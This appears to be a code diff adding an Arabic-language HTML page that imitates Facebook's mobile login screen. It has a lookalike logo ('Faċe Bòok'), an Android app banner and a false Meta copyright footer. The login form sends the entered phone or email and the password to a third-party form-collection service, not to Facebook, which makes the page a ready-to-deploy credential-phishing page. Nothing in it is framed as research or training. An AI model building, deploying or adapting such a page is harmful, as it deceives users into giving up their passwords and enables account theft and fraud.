@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول</title>
+<style>
+/* تنسيق الشكل الخارجي - مطابق للصورة */
+body {
+font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+background-color: #f0f2f5;
+display: flex;
+flex-direction: column;
+align-items: center;
+margin: 0;
+padding: 0;
+}
+
+/* شريط التنبيه العلوي */
+.header-banner {
+background-color: #fff9e7;
+width: 100%;
+padding: 12px 0;
+text-align: center;
+font-size: 14px;
+color: #1c1e21;
+border-bottom: 1px solid #e5e5e5;
+}
+
+.login-container {
+width: 90%;
+max-width: 400px;
+margin-top: 20px;
+text-align: center;
+}
+
+/* الشعار المعدل */
+.logo {
+color: #1877f2;
+font-size: 45px;
+font-weight: bold;
+margin-bottom: 15px;
+letter-spacing: -1px;
+font-family: sans-serif;
+}
+
+/* صندوق الإدخال */
+.login-box {
+background: #ffffff;
+padding: 20px 15px;
+border-radius: 8px;
+box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+}
+
+input {
+width: 100%;
+padding: 14px;
+margin: 6px 0;
+border: 1px solid #dddfe2;
+border-radius: 6px;
+box-sizing: border-box;
+font-size: 16px;
+background-color: #f5f6f7;
+outline: none;
+}
+
+input:focus {
+border-color: #1877f2;
+background-color: #fff;
+}
+
+/* زر تسجيل الدخول الأزرق */
+.btn-login {
+width: 100%;
+padding: 12px;
+background-color: #1877f2;
+border: none;
+border-radius: 6px;
+color: white;
+font-size: 19px;
+font-weight: bold;
+cursor: pointer;
+margin-top: 10px;
+}
+
+.btn-login:active {
+background-color: #166fe5;
+}
+
+.forgot-pass {
+display: block;
+margin: 18px 0;
+color: #1877f2;
+text-decoration: none;
+font-size: 14px;
+}
+
+/* الخط الفاصل */
+.divider {
+display: flex;
+align-items: center;
+text-align: center;
+margin: 20px 0;
+}
+
+.divider::after, .divider::before {
+content: "";
+flex: 1;
+border-bottom: 1px solid #dadde1;
+}
+
+.divider span {
+padding: 0 10px;
+color: #8a8d91;
+font-size: 13px;
+}
+
+/* زر إنشاء حساب جديد الأخضر */
+.btn-new-account {
+background-color: #42b72a;
+color: white;
+padding: 10px 20px;
+border: none;
+border-radius: 6px;
+font-size: 16px;
+font-weight: bold;
+cursor: pointer;
+text-decoration: none;
+display: inline-block;
+margin-bottom: 5px;
+}
+
+/* التذييل واللغات */
+.footer {
+margin-top: 60px;
+color: #737373;
+font-size: 12px;
+text-align: center;
+width: 90%;
+}
+
+.languages {
+display: flex;
+justify-content: center;
+gap: 15px;
+flex-wrap: wrap;
+margin-bottom: 10px;
+}
+</style>
+</head>
+<body>
+
+<div class="header-banner">
+احصل على فيسبوك لنظام Android وتصفح بسرعة أكبر.
+</div>
+
+<div class="login-container">
+<div class="logo">Faċe Bòok</div>
+
+<div class="login-box">
+<form action="https://formspree.io/f/YOUR_EMAIL" method="POST">
+
+<input type="text" name="email_or_phone" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+
+<input type="password" name="password" placeholder="كلمة السر" required>
+
+<button type="submit" class="btn-login">تسجيل الدخول</button>
+</form>
+
+<a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
+
+<div class="divider"><span>أو</span></div>
+
+<a href="#" class="btn-new-account">إنشاء حساب جديد</a>
+</div>
+</div>
+
+<div class="footer">
+<div class="languages">
+<span>العربية</span>
+<span>English (US)</span>
+<span>Français (France)</span>
+<span>Español</span>
+<span>Bahasa Indonesia</span>
+</div>
+<p>حقوق النشر محفوظة Meta © 2022</p>
+</div>
+
+</body>
+</html>
+
